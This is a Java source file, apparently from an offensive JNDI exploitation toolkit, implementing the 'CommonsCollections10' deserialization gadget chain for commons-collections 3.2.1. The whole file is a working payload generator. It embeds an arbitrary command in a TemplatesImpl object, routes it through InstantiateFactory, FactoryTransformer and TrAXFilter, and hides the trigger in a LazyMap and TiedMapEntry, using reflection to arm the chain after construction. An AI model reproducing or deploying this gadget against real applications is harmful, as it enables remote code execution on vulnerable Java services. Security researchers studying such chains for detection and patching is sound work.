package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;



@Dependencies({"commons-collections:commons-collections:3.2.1"})

public class CommonsCollections10 implements ObjectPayload<Object> {

    public Object getObject(String command) throws Exception {
        final Object templates;
        templates = Gadgets.createTemplatesImpl(command);
        // 使用 InstantiateFactory 代替 InstantiateTransformer
        InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});

        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);

        // 先放一个无关键要的 Transformer
        ConstantTransformer constantTransformer = new ConstantTransformer(1);
        Map                 innerMap            = new HashMap();
        LazyMap             outerMap            = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);
        TiedMapEntry        tme                 = new TiedMapEntry(outerMap, "QI4L");
        Map                 expMap              = new HashMap();
        expMap.put(tme, "QI5L");

        Reflections.setFieldValue(outerMap, "factory", factoryTransformer);

        outerMap.remove("QI4L");

        return expMap;
    }
}
